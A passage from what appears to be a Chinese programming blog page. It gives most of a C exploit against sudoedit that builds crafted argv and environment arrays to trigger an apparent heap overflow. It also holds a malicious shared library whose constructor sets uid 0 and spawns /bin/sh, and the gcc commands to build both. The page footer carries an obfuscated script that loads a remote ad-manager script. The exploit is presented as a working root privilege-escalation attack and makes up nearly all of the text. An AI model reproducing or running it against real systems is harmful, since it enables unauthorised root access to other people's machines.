<span class="token number">39.</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>envName<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">40.</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"=C.UTF-8@"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">41.</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>size<span class="token operator">-</span><span class="token number">0x17</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">42.</span>            <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">43.</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>result<span class="token punctuation">;</span>  
<span class="token number">44.</span>    <span class="token punctuation">}</span>  
<span class="token number">45.</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  
<span class="token number">46.</span><span class="token punctuation">}</span>  
<span class="token number">47.</span>  
<span class="token number">48.</span><span class="token keyword">void</span> <span class="token function">final</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token number">49.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">50.</span>    now <span class="token operator">--</span><span class="token punctuation">;</span>  
<span class="token number">51.</span>    <span class="token keyword">char</span> <span class="token operator">*</span> result<span class="token punctuation">;</span>  
<span class="token number">52.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">)</span>  
<span class="token number">53.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">54.</span>        now <span class="token operator">--</span><span class="token punctuation">;</span>  
<span class="token number">55.</span>    <span class="token punctuation">}</span>  
<span class="token number">56.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">57.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">58.</span>        result<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">59.</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>envName<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">60.</span>        <span class="token function">strcat</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span><span class="token string">"=xxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">61.</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>result<span class="token punctuation">;</span>  
<span class="token number">62.</span>    <span class="token punctuation">}</span>  
<span class="token number">63.</span><span class="token punctuation">}</span>  
<span class="token number">64.</span>  
<span class="token number">65.</span><span class="token keyword">int</span> <span class="token function">setargv</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">)</span>  
<span class="token number">66.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">67.</span>    size<span class="token operator">-=</span><span class="token number">0x10</span><span class="token punctuation">;</span>  
<span class="token number">68.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>  
<span class="token number">69.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>  
<span class="token number">70.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span>  
<span class="token number">71.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>size<span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span>offset<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>  
<span class="token number">72.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> tmp<span class="token operator">=</span>b<span class="token operator">*</span>b<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>a<span class="token operator">*</span>c<span class="token punctuation">;</span>  
<span class="token number">73.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">74.</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">75.</span>    tmp<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>tmp<span class="token operator">*</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">76.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> A<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span>b<span class="token operator">+</span>tmp<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">77.</span>    <span class="token keyword">signed</span> <span class="token keyword">int</span> B<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span>b<span class="token operator">-</span>tmp<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">78.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">79.</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">80.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>A<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token number">81.</span>        x<span class="token operator">=</span><span class="token punctuation">(</span>A<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> A<span class="token operator">:</span> B<span class="token punctuation">;</span>  
<span class="token number">82.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> B <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">83.</span>        x<span class="token operator">=</span><span class="token punctuation">(</span>A<span class="token operator">&lt;</span>B<span class="token punctuation">)</span> <span class="token operator">?</span> A <span class="token operator">:</span> B<span class="token punctuation">;</span>  
<span class="token number">84.</span>    y<span class="token operator">=</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>  
<span class="token number">85.</span>    <span class="token keyword">int</span> len<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token operator">+</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>  
<span class="token number">86.</span>  
<span class="token number">87.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>offset<span class="token operator">-</span>len<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span>  
<span class="token number">88.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">89.</span>        x<span class="token operator">--</span><span class="token punctuation">;</span>  
<span class="token number">90.</span>        y<span class="token operator">=</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>  
<span class="token number">91.</span>        len<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>  
<span class="token number">92.</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">93.</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">94.</span>    <span class="token punctuation">}</span>  
<span class="token number">95.</span>    <span class="token keyword">int</span> envoff<span class="token operator">=</span>offset<span class="token operator">-</span>len<span class="token operator">-</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">;</span>  
<span class="token number">96.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,%d,%dn"</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">97.</span>    <span class="token keyword">char</span> <span class="token operator">*</span> Astring<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">98.</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token number">99.</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>y<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">100.</span>        Astring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'A'</span><span class="token punctuation">;</span>  
<span class="token number">101.</span>    Astring<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token char">'x00'</span><span class="token punctuation">;</span>  
<span class="token number">102.</span>  
<span class="token number">103.</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"sudoedit"</span><span class="token punctuation">;</span>  
<span class="token number">104.</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"-s"</span><span class="token punctuation">;</span>  
<span class="token number">105.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>x<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">106.</span>        argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\"</span><span class="token punctuation">;</span>  
<span class="token number">107.</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>Astring<span class="token punctuation">;</span>  
<span class="token number">108.</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\"</span><span class="token punctuation">;</span>  
<span class="token number">109.</span>    argv<span class="token punctuation">[</span>argvnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">110.</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>envoff<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  
<span class="token number">111.</span>        envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\"</span><span class="token punctuation">;</span>  
<span class="token number">112.</span>    envp<span class="token punctuation">[</span>envnow<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"X/test"</span><span class="token punctuation">;</span>  
<span class="token number">113.</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token number">114.</span><span class="token punctuation">}</span>  
<span class="token number">115.</span>  
<span class="token number">116.</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token number">117.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">118.</span>    <span class="token function">setargv</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x650</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">119.</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">120.</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">121.</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">122.</span>    <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">123.</span>    <span class="token function">final</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">124.</span>  
<span class="token number">125.</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/usr/local/bin/sudoedit"</span><span class="token punctuation">,</span>argv<span class="token punctuation">,</span>envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">126.</span><span class="token punctuation">}</span>  



<span class="token number">1.</span>#include <span class="token operator">&lt;</span>unistd<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">2.</span>#include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">3.</span>#include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">4.</span>#include <span class="token operator">&lt;</span>string<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">5.</span>  
<span class="token number">6.</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">7.</span>  
<span class="token number">8.</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">9.</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] bl1ng bl1ng! We got it!n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">10.</span>#ifndef BRUTE  
<span class="token number">11.</span>        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">12.</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  
<span class="token number">13.</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  
<span class="token number">14.</span>        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">15.</span>#endif  
<span class="token number">16.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>编译命令：</p> 
<pre><code class="prism language-bash"><span class="token number">1</span>.mkdir libnss_X  
<span class="token number">2</span>.gcc -fPIC -shared lib.c -o ./libnss_X/test.so.2  
<span class="token number">3</span>.gcc exp.c -o exp  
</code></pre>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>